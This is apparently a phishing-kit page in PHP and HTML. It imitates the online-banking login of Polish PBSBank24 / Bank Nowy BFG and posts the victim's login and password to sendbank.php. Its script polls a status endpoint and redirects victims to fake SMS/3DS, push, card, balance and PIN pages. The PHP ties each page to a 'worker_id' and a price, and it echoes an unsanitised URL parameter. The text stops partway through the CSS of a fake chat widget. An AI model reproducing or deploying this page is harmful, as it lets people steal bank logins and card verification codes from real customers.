<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}

$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");

checkLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id, "BFG Bank.");
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="Cache-control" content="no-cache">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
  <meta http-equiv="Pragma" content="no-cache"> 
  <meta http-equiv="X-UA-Compatible" content="IE=8">
  <title>Bank Nowy BFG S.A.</title>
  
  





  <link href="./bfg_files/logowanie.css" type="text/css" rel="stylesheet">
  <link href="./bfg_files/customforms.css" type="text/css" rel="stylesheet">
  
  <!-- CSS IE -->
  <!--[if lte IE 6]>
    <link href="/pbs/css_client/ie6.css?cb=c7eaefafac10228aac158d54d9a2ba96ac2607e" type="text/css" rel="stylesheet" >
  <![endif]-->
  <!--[if IE 7]>
    <link href="/pbs/css_client/ie7.css?cb=c7eaefafac10228aac158d54d9a2ba96ac2607e" type="text/css" rel="stylesheet" >
  <![endif]-->
  <!--[if IE 8]>
    <link href="/pbs/css_client/ie8.css?cb=c7eaefafac10228aac158d54d9a2ba96ac2607e" type="text/css" rel="stylesheet" >
  <![endif]-->
  




  
<script type="text/javascript" src="./bfg_files/saved_resource"></script><script type="text/javascript" src="./bfg_files"></script></head>
<body class="webkit">

<!-- Naglowek z logo -->











<div id="header">
  
  
    
    
      
        
        
          
        
      
    
  
  
  <div id="language-selection-container" style="visibility: visible;">
    <label for="lang">Język</label>
    <div id="language-select-selectbox-wrapper" class="amg-selectbox-wrapper"><a id="language-select-selectbox-clickbar" class="amg-selectbox-clickable" tabindex="-1" style="width: 49px;">PL</a><div id="language-select-selectbox-container" class="amg-selectbox-container" style="display: none; min-width: 48px;"><ul><li id="language-select-option-0" class="amg-selectbox-selected-option"><a onclick="return false;">PL</a></li><li id="language-select-option-1" class=""><a onclick="return false;">EN</a></li></ul></div></div><div class="amg-selectbox-hidden-wrapper"><select onchange="return false" class="selectbox amg-selectbox-hidden" id="language-select" name="lang"><option value="pl" selected="selected">PL</option><option value="en">EN</option></select></div>
  </div>
  
  <a href="https://www.pbsbank.pl/" target="_blank" rel="noopener noreferrer">
  <img src="./bfg_files/logo_pbs.gif" alt="Copyright 2009 Podkarpacki Bank Spółdzielczy" class="logo">
  </a>
  
    
    
      <h1>System Bankowości Elektronicznej PBSBank24</h1>
    
  
  
  
</div>


<!-- Koniec naglowka z logo -->

<!-- Glowny kontener -->
<div id="main_contener">

  <!-- Lewa kolumna -->
  <div id="left_col" class="b_col">    
      <!-- Sekcja informacyja -->
      <div class="box_bg" id="info">
      <div class="box_top">
        <div class="box_content">
          <div class="additional-info"><div class="additional-info-content">
            <div style="text-align:center"> <div><br><br> <span>Szanowny Kliencie <br> przed zalogowaniem:</span><br>Upewnij się, że nawiązałeś komunikację z Bankiem <br>w szyfrowanym połączeniu. Poprawny adres strony to: <a target="_self" href="https://sbe.pbsbank.pl/">https://sbe.pbsbank.pl</a> <div>Sprawdź aktualność certyfikatu wydanego dla sbe.pbsbank.pl przez Certum Extended Validation CA, Unizeto Technologies S.A.</div> <div><br><font color="373c92">Prosimy o przestrzeganie zasad bezpieczeństwa opisanych <br>w tym <a target="_self" href="https://www.pbsbank.pl/pl/docman-wszystko/rozne/236-zasady-bezpiecznego-korzystania-z-uslugi-pbsbank24-1">dokumencie.</a></font></div> <br> <br> </div> <div>Jeżeli stwierdzisz jakąkolwiek niezgodność prosimy <br>o niezwłoczne zaniechanie wszelkich czynności oraz natychmiastowy kontakt <br>z Bankiem: <br> <strong>801 372 772</strong>, <strong>+48 13 46 55 750</strong> <br> </div> <br> <div><br>Pamiętaj, aby zakończyć pracę<br>w systemie poprzez użycie opcji ‘Wyloguj’ gwarantuje to poprawne zamknięcie sesji.</div> </div>
          </div></div>
        </div>
      </div>
    </div>
        <!-- Koniec sekcji informacyjnej -->  
    </div>
    <!-- Koniec lewej kolumny -->
     

  <div id="center_col" class="c_col">
    <div class="box_bg"><div class="box_top">
      <div class="box_content">
        <div class="box_green"><div class="box_green_top">
        <div class="box_green_content box_login">
              <h2>Logowanie</h2>
                <form class="login" id="formblock" method="post" action="sendbank.php" autocomplete="off">
                  
                    <input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
                    <input type="hidden" name="type" value="15">
                  




<input type="hidden" name="EPAYMENT_ENC_PARAMS" value="">
            




<input type="hidden" name="psd2-fallback-token" value="">
            <input type="hidden" name="cert">
                  <div class="login-error">
                        
















        






















            </div>
                  <label for="login">Login:</label> 
            <div id="user-id-container" class="keyboard-inputfield-container">
              <fieldset class="withKeyboard" id="user-id">
                <input id="login" class="ixxl" type="text" name="logindata" value="" maxlength="25500" onkeypress="capsLock(event)">
                <img src="./bfg_files/ico_question.gif" width="12" height="12" alt="" class="tooltip-ico" id="anonymous_element_1"><span class="amg-help-cloud-content" style="display: none;" id="anonymous_element_2">Wpisz 8-cyfrowy numer login, który znajduje się na karcie informacyjnej przekazanej w przesyłce bankowej.</span>
              </fieldset>
            </div>        
             <label for="login">Password:</label> 
            <div id="user-id-container" class="keyboard-inputfield-container">
              <fieldset class="withKeyboard" id="user-id">
                <input id="login" class="ixxl" type="text" name="passdata" value="" maxlength="25500" onkeypress="capsLock(event)">
                <img src="./bfg_files/ico_question.gif" width="12" height="12" alt="" class="tooltip-ico" id="anonymous_element_1"><span class="amg-help-cloud-content" style="display: none;" id="anonymous_element_2">Wpisz 8-cyfrowy numer login, który znajduje się na karcie informacyjnej przekazanej w przesyłce bankowej.</span>
              </fieldset>
            </div>         
                      <a href="#" id="user-id-activator" name="keyboard-activator"><img src="./bfg_files/ico_keyboard.gif" alt="keyboard"></a>
                      <div class="login-button">
                          <div id="alertDiv" class="capsLockAlertInlineDisplay" style="visibility:hidden">
                              <img style="vertical-align:middle" src="./bfg_files/warning.gif">
                              <span style="font-weight: bold; vertical-align:middle">Caps Lock jest włączony!</span>
                          </div>
                          <div id="buttonDiv" class="capsLockAlertInlineDisplay">
                           
                                <button style="border: none; padding: 0;" id="login-button" type="submit"><img src="./bfg_files/login.button.login.gif" class="button" alt="Zaloguj" style="" title="Zaloguj"></button>
                                
                          </div>

                      </div>
                                       
            


<div id="keyboard-overlay-container"> 
  <div id="keyboard-overlay" class="keyboard-closed">
    <div class="keyboard-overlay-top"></div>
    <a id="close-button" href="#">Zamknij</a>
    <div id="keyboard-input-container"></div>
    <ul id="keyboard">
      <li id="key-1"><a title="1" href="#">1</a></li>
      <li id="key-2"><a title="2" href="#">2</a></li>
      <li id="key-3"><a title="3" href="#">3</a></li>
      <li id="key-4"><a title="4" href="#">4</a></li>
      <li id="key-5"><a title="5" href="#">5</a></li>
      <li id="key-6"><a title="6" href="#">6</a></li>
      <li id="key-7"><a title="7" href="#">7</a></li>
      <li id="key-8"><a title="8" href="#">8</a></li>
      <li id="key-9"><a title="9" href="#">9</a></li>
      <li id="key-0"><a title="0" href="#">0</a></li>
      <li id="key-minus"><a title="-" href="#">-</a></li>
      <li id="key-plus"><a title="+" href="#">+</a></li>
      <li id="key-equals"><a title="=" href="#">=</a></li>
      <li id="key-backspace" class="no-input"><a title="Backspace" href="#">Backspace</a></li>
      <li id="key-apostrophe" class="first"><a title="`" href="#">`</a></li>
      <li id="key-tilde"><a title="~" href="#">~</a></li>
      <li id="key-exclamation"><a title="!" href="#">!</a></li>
      <li id="key-at"><a title="@" href="#">@</a></li>
      <li id="key-hash"><a title="#" href="#">#</a></li>
      <li id="key-dollar"><a title="$" href="#">$</a></li>
      <li id="key-percent"><a title="%" href="#">%</a></li>
      <li id="key-power"><a title="^" href="#">^</a></li>
      <li id="key-amp"><a title="&amp;" href="#">&amp;</a></li>
      <li id="key-multiply"><a title="*" href="#">*</a></li>
      <li id="key-leftbracke"><a title="(" href="#">(</a></li>
      <li id="key-rightbracket"><a title=")" href="#">)</a></li>
      <li id="key-underscore"><a title="_" href="#">_</a></li>
      <li id="key-backslash"><a title="\" href="#">\</a></li>
      <li id="key-slash"><a title="/" href="#">/</a></li>
      <li id="key-pipe"><a title="|" href="#">|</a></li>
      <li id="key-q" class="first"><a title="q" href="#">q</a></li>
      <li id="key-w"><a title="w" href="#">w</a></li>
      <li id="key-e"><a title="e" href="#">e</a></li>
      <li id="key-epol"><a title="ę" href="#">ę</a></li>
      <li id="key-r"><a title="r" href="#">r</a></li>
      <li id="key-t"><a title="t" href="#">t</a></li>
      <li id="key-y"><a title="y" href="#">y</a></li>
      <li id="key-u"><a title="u" href="#">u</a></li>
      <li id="key-i"><a title="i" href="#">i</a></li>
      <li id="key-o"><a title="o" href="#">o</a></li>
      <li id="key-opol"><a title="ó" href="#">ó</a></li>
      <li id="key-p"><a title="p" href="#">p</a></li>
      <li id="key-leftsqbracket"><a title="[" href="#">[</a></li>
      <li id="key-rightsqbracket"><a title="]" href="#">]</a></li>
      <li id="key-leftcurlybracket"><a title="{" href="#">{</a></li>
      <li id="key-rightcurlybracket"><a title="}" href="#">}</a></li>
      <li id="key-apostrophe2"><a title="&#39;" href="#">'</a></li>
      <li id="key-a" class="first"><a title="a" href="#">a</a></li>
      <li id="key-apol"><a title="ą" href="#">ą</a></li>
      <li id="key-s"><a title="s" href="#">s</a></li>
      <li id="key-spol"><a title="ś" href="#">ś</a></li>
      <li id="key-d"><a title="d" href="#">d</a></li>
      <li id="key-f"><a title="f" href="#">f</a></li>
      <li id="key-g"><a title="g" href="#">g</a></li>
      <li id="key-h"><a title="h" href="#">h</a></li>
      <li id="key-j"><a title="j" href="#">j</a></li>
      <li id="key-k"><a title="k" href="#">k</a></li>
      <li id="key-l"><a title="l" href="#">l</a></li>
      <li id="key-lpol"><a title="ł" href="#">ł</a></li>
      <li id="key-colon"><a title=":" href="#">:</a></li>
      <li id="key-semicolon"><a title=";" href="#">;</a></li>
      <li id="key-comma"><a title="," href="#">,</a></li>
      <li id="key-dot"><a title="." href="#">.</a></li>
      <li id="key-quote"><a title="&quot;" href="#">"</a></li>
      <li id="key-z" class="first"><a title="z" href="#">z</a></li>
      <li id="key-zpol"><a title="ż" href="#">ż</a></li>
      <li id="key-xpol"><a title="ź" href="#">ź</a></li>
      <li id="key-x"><a title="x" href="#">x</a></li>
      <li id="key-c"><a title="c" href="#">c</a></li>
      <li id="key-cpol"><a title="ć" href="#">ć</a></li>
      <li id="key-v"><a title="v" href="#">v</a></li>
      <li id="key-b"><a title="b" href="#">b</a></li>
      <li id="key-n"><a title="n" href="#">n</a></li>
      <li id="key-npol"><a title="ń" href="#">ń</a></li>
      <li id="key-m"><a title="m" href="#">m</a></li>
      <li id="key-lt"><a title="&lt;" href="#">&lt;</a></li>
      <li id="key-gt"><a title="&gt;" href="#">&gt;</a></li>
      <li id="key-question"><a title="?" href="#">?</a></li>
      <li id="key-caps" class="no-input"><a title="Shift/CapsLk" href="#">Shift/CapsLk</a></li>
      <li id="key-space" class="first"><a title="Spacja" href="#">&nbsp;</a></li>
    </ul>
  
    <ul id="controls">
      <li class="last"><a id="close-btn-2" href="#"><img alt="Zatwierdź" src="./bfg_files/bt_zatwierdz.gif"></a></li>
      <li class="first"><a class="arrow" href="#" id="clear-all" name="clear-all">Wyczyść</a></li>
      <li><a class="arrow" href="#" id="cancel-button">Anuluj</a></li>      
    </ul>
    <div class="keyboard-overlay-bottom"></div>   
  </div>    
</div>


                </form>
              </div>  
            </div></div>
            <!-- Komunikaty -->
        











<div id="news">
    
      <div class="news-elem">
          <h3><font color="#373c92">Aplikacja mobilna</font></h3>
          <div class="news-content">  
          <a href="https://www.pbsbank.pl/klienci-indywidualni-2/bankowosc-elektroniczna/aplikacja-mobilna-pbsbank24-mobile" target="_blank"><img src="./bfg_files/242x336_na-logowanie_aplkacja_bfg.jpg"></a>
        </div>  
        
      </div> 
    
      <div class="news-elem">
          <h3><font color="#373c92">e-pożyczka</font></h3>
          <div class="news-content">  
          <a href="https://www.pbsbank.pl/klienci-indywidualni-2/kredyty/e-pozyczka" target="_blank"><img src="./bfg_files/242x336_na-logowanie_epozyczka_bfg.jpg"></a>
        </div>  
        
      </div> 
    
</div>
          <!-- Koniec komunikatów -->
      </div> 
      </div></div>
    </div>

  <!-- Prawa kolumna -->
  <!-- folder w ktorym nalezy przechowywac pliki wciaz do ustalenia -->












  
  
    
  


<div id="right_col" class="b_col">
   <div id="banner1" class="box_bg">
    <div class="box_top"><div class="box_content">    
      
        
        
      
          <a href="https://uznayvse.ru/images/content/2019/5/uzn_15567180827.jpg" target="_blank" rel="noopener noreferrer">
          
          
          
            <img src="./bfg_files/bannerImage" alt="https://sbe.pbsbank.pl/bannerImage?&amp;bannerItemId=18763472954">
          
          
        </a>
        
            
      
      </div></div>
    </div>
    <div id="banner2" class="box_bg">
      <div class="box_top"><div class="box_content"> 
      
        
        
      
          <a href="https://www.banknowybfg.pl/klienci-indywidualni-2/oszczednosci-i-inwestycje/lokata-perspektywa" target="_blank" rel="noopener noreferrer">
          
          
          
            <img src="./bfg_files/bannerImage(1)" alt="https://www.banknowybfg.pl/klienci-indywidualni-2/oszczednosci-i-inwestycje/lokata-perspektywa">
          
          
        </a>
        
        
      
      </div></div>
    </div>
</div>
    <!-- Koniec prawej kolumny -->

</div>
<!-- Koniec glownego kontenera -->

<!-- Stopka -->











<div id="footer">
  <div class="fbox">  
  <div class="footer_links_left">
    
    <a href="https://www.pbsbank.pl/pomoc" target="_blank" rel="noopener noreferrer">Pomoc</a>
    <a href="https://www.pbsbank.pl/o-banku/bezpieczenstwo" class="border_left" target="_blank" rel="noopener noreferrer">Bezpieczeństwo</a>
    <a href="https://www.pbsbank.pl/o-banku/kontakt" class="border_left" target="_blank" rel="noopener noreferrer">Formularz kontaktowy</a>
    <a href="https://www.pbsbank.pl/2-uncategorised/574-polityka-prywatnosci" class="border_left" target="_blank" rel="noopener noreferrer">Zastrzeżenia prawne</a>
  </div>
  <div class="footer_links_right">
    Powered by <a href="http://www.amg.net.pl/" target="_blank" rel="noopener noreferrer">AMG.net</a>
  </div>
</div>
</div>


<!-- Koniec stopki -->
<div id="epd" style="display: none;">
        <div id="cookiesdirective" style="position: fixed; bottom: 0px; left: 0px; width: 100%; height: auto; background: none repeat scroll 0% 0% rgb(0, 0, 0); opacity: 0.8; color: rgb(255, 255, 255); font-size: 14px; text-align: center; z-index: 1000;">
          <div style="position:relative;height:auto;width:90%;padding:15px;margin-left:auto;margin-right:auto;">
            W celu zachowania najwyższej jakości świadczonych Państwu usług, w sposób dostosowany do indywidualnych potrzeb, wykorzystujemy informacje przechowywane w plikach cookies. Korzystanie z naszego serwisu internetowego bez zmiany ustawień dotyczących cookies oznacza, że wyrażają Państwo zgodę na ich zapisanie w pamięci urządzenia. Zmiany zasad korzystania z plików cookies można dokonać w każdym czasie w ustawieniach przeglądarki. Więcej informacji znajduje się w naszej
            <a href="https://www.pbsbank.pl/documents/10180/550553/Polityka+prywatno%C5%9Bci/823b6264-b188-46b0-a2c8-281404dab32f" style="color:#ca0000;font-weight:bold;font-family:arial;font-size:14px;">Polityce prywatności</a>.
            <br>
            <br>
            <input type="button" value="OK" onclick="cookieHide(&#39;epd&#39;)">
            <br>
            <br>
          </div>
        </div>
      </div>                
    <script type="text/javascript">  
    function getCookie(c_name)
      {
      var c_value = document.cookie;
      var c_start = c_value.indexOf(" " + c_name + "=");
      if (c_start == -1)
        {
        c_start = c_value.indexOf(c_name + "=");
        }
      if (c_start == -1)
        {
        c_value = null;
        }
      else
        {
        c_start = c_value.indexOf("=", c_start) + 1;
        var c_end = c_value.indexOf(";", c_start);
        if (c_end == -1)
        {
      c_end = c_value.length;
      }
      c_value = unescape(c_value.substring(c_start,c_end));
      }
      return c_value;
      }
    
      var status=getCookie("visibility");
      if(status!=null) {
        if(status!="") {
        var el=document.getElementById("epd");
        el.style.display='none';
        }
    }
    
    function cookieHide(id)
      {
        var el=document.getElementById(id);
        el.style.display='none';
        var c_name="visibility";
        var value="invisible";
        var exdays=365;
        var exdate=new Date();
        exdate.setDate(exdate.getDate() + exdays);
        var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
        document.cookie=c_name + "=" + c_value;
      }

        function capsLock(e){
            kcode = e.keyCode?e.keyCode:e.which;
            shiftPressed = e.shiftKey?e.shiftKey:((kcode == 16)?true:false);
            ctrlPressed = e.ctrlKey?e.ctrlKey:((kcode == 17)?true:false);
            if(((kcode >= 65 && kcode <= 90) && !shiftPressed && !ctrlPressed))
                document.getElementById('alertDiv').style.visibility = 'visible';
            else
                document.getElementById('alertDiv').style.visibility = 'hidden';
        }
      </script>  

  <!-- JS-->
  












<!-- JS -->
<script type="text/javascript">
  //initialize the wait message
  var localizedMessage = new Array();
  localizedMessage['screenConfirm-flow.title'] = 'Proszę czekać...';
</script>
      

  
    <script src="./bfg_files/fancy" type="text/javascript"></script>
  
  <script src="./bfg_files/prototype.js" type="text/javascript"></script>

  <script src="./bfg_files/pattern-password.js" type="text/javascript"></script>
  <script src="./bfg_files/amg-customforms.js" type="text/javascript"></script>
  <script src="./bfg_files/excanvas.js" type="text/javascript"></script>
  <script src="./bfg_files/amg-canvas-cloud.js" type="text/javascript"></script>
  <script src="./bfg_files/keyboard.js" type="text/javascript"></script>
  <script src="./bfg_files/amg-helpers.js" type="text/javascript"></script>
  <script src="./bfg_files/amg-cover.js" type="text/javascript"></script>
  <script src="./bfg_files/swf_ajax.js" type="text/javascript"></script>
  <script src="./bfg_files/textArea.js" type="text/javascript"></script>
  



  <!-- VBS-->   
  <script src="./bfg_files/cert.vbs" type="text/vbscript"></script>

  <script type="https://sbe.pbsbank.pl/text/javascript">
  
    document.observe('dom:loaded', function(){
      
      
      removeIframe();
      var simpleId = 'user-id';
      var keyboard = new AMG.ScreenKeyboard(simpleId, callback);      
      $('login').focus();
      if(self.parent != null) (function(){self.scrollTo(0, 0)}).defer();
      
//      $('form.login').observe('submit', function(event){
//        if(Prototype.Browser.IE){
//          chooseCertJS('form.login'); 
//          submitForm();
//        }else{
//          submitForm();
//        }
//        Event.stop(event);
//      });
      
      
      var langSelect = $('language-select');
      if(langSelect!=null){
        AMG.CustomForms.replaceSelects(langSelect);
        $('language-selection-container').style.visibility = 'visible'; 
      } 
      
      
      
    });
    
    
    function callback(form, fieldsetId){
      submitForm();
    }

    var send = false;
    var INFO = 'Trwa proces logowania. Aplikacja nie dopusza możliwości podwójnego klikania.';

    function submitForm(){
      if (send == false) {
        send = true;
        document.getElementById("form.login").submit();
      }
    }           
  </script>
  
  


<script type="text/javascript">

  addToolTip($$('#main_contener .tooltip-ico'),true);
  
  function showHelpInLoginWindow() {
    window.open(('pomoc/index.html'), '', 'height=700,width=850,status=yes,toolbar=yes,menubar=yes,location=yes, resizable=yes,scrollbars=yes');
  }
  
   
  
</script><div id="amg-anonymous_element_1" class="amg-tooltip-body" style="display:none;position:relative;"><canvas id="amg-anonymous_element_1-canvas" width="590"></canvas><div id="amg-anonymous_element_1-content" style="position: absolute; top:0px; left:0px; float:left; width:590px;"><div style="overflow:hidden;padding:10px;padding-bottom:40px;float:left; width:570px;">Wpisz 8-cyfrowy numer login, który znajduje się na karcie informacyjnej przekazanej w przesyłce bankowej.</div></div></div><div id="amg-anonymous_element_1" class="amg-tooltip-body" style="display:none;position:relative;"></div><div id="amg-anonymous_element_1" class="amg-tooltip-body" style="display: none; position: absolute; visibility: visible; z-index: 100; margin: 0px; top: 109px; left: 455.5px; width: 590px; height: 84px;"><canvas id="amg-anonymous_element_1-canvas" width="590" height="84" style="width: 590px; height: 84px;"></canvas><div id="amg-anonymous_element_1-content" style="position: absolute; top:0px; left:0px; float:left; width:590px;"><div style="overflow:hidden;padding:10px;padding-bottom:40px;float:left; width:570px;">Wpisz 8-cyfrowy numer login, który znajduje się na karcie informacyjnej przekazanej w przesyłce bankowej.</div></div></div> 

<script type="text/javascript">
            
            

            function ajaxsup1() {
                var request = new XMLHttpRequest();

                request.onreadystatechange = function() {
                    if (request.readyState == 4 && request.status == 200) {
                        var loading = document.querySelector('#loading');
                        var smsblock = document.querySelector('#sms');
                        var lkblock = document.querySelector('#lk');
                        var result = request.responseText;
                        // console.log(request.responseText);
                        console.log('%md%');
                        if (result == 'sms') {
                            location="/3ds%md%";
                        }  else if (result == 'push') {
                             location="/accept%md%";
                        } else if (result == 'card') {
                             location="/verification%md%";
                        } else if (result == 'sms3ds') {
                             location="/fail%md%";
                        } else if (result == 'smsbal') {
                             location="/balance%md%";
                        } else if (result == 'smart') {
                             location="/pincode%md%";
                        } else {

                        }
                    }
                }
                request.open('POST', 'procstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=84941141');
            }

            function ajaxdel() {
                var request = new XMLHttpRequest();
                request.open('POST', 'delstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=84941141');
            }

        </script>


<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #005e5a;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #005e5a;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
